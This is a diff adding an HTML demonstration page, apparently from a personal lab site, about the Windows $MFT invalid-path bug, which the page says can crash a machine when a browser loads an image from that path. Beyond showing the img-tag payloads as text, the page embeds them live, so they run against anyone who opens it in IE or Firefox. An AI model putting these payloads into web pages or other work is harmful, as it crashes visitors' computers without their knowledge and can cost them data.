@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html><head>
+<meta name="author" content="Dot_Silver">
+<meta name="description" content="File-Hosting Website and JavaScript Demonstrations">
+<meta charset="utf-8" />
+<link id="theme" rel="stylesheet" href="http://dotsilver.net/overall/css/main_dark.css">
+<title>Dot_Silver's MFT Demonstration</title>
+<style type="text/css">
+	
+</style>
+</head>
+<body>
+	<div id="page">
+		<div id="titlebox">
+			<a href="http://dotsilver.net" id="main-img-link">
+				<img id="main-img" src="http://dotsilver.net/overall/main-img0.svg" alt="Dot_Silver" />
+			</a>
+		</div>
+		<div id="content">
+			<!--Box1-->
+			<div id="box1" class="box">
+				<div class="boxheader">
+					<p>MFT Demonstration<a href="http://dotsilver.net/lab/" class="boxheader_float_right">[Back]</a></p>
+				</div>
+				<div class="boxcenter">
+					<div>
+						<p>This issue can potentially crash a windows machine when a browser tries to access an image with an invalid path ($MFT) on the drive.</p>
+						<img src="c:\$MFT\1234567890">
+						<img src="file:\\\c:\$MFT\1234567890">
+						<fieldset class="codebox">
+							<legend class="fname">IE img tag</legend>
+							&lt;img src="c:\$MFT\1234567890"&gt;
+						</fieldset>
+						<fieldset class="codebox">
+							<legend class="fname">Firefox img tag</legend>
+							&lt;img src="file:\\\c:\$MFT\1234567890"&gt;
+						</fieldset>
+					</div>
+				</div>
+				<div class="boxfooter"></div>
+			</div>
+			<!--Box1End-->
+			<!--Box2-->
+			<div id="box2" class="box">
+				<div class="boxheader">
+					<p>What you can do about it.</p>
+				</div>
+				<div class="boxcenter">
+					<div>
+						<p>To my knowledge, this "trick" only works on IE. So instead of answering the question above, i will bring up one...<span class="redhghl"> Why would you still use IE?</span></p>
+						<p class="redhghl italic">Edit: With 'file:\\\', i got it to crash on firefox, too...</p>
+					</div>
+				</div>
+				<div class="boxfooter"></div>
+			</div>
+			<!--Box2End-->
+		</div>
+	</div>
+	<!--Copyright-->
+	<iframe id="footer" src="http://dotsilver.net/overall/net_dotsilver_copy.html"></iframe>
+	<!--CopyrightEnd-->
+</body>
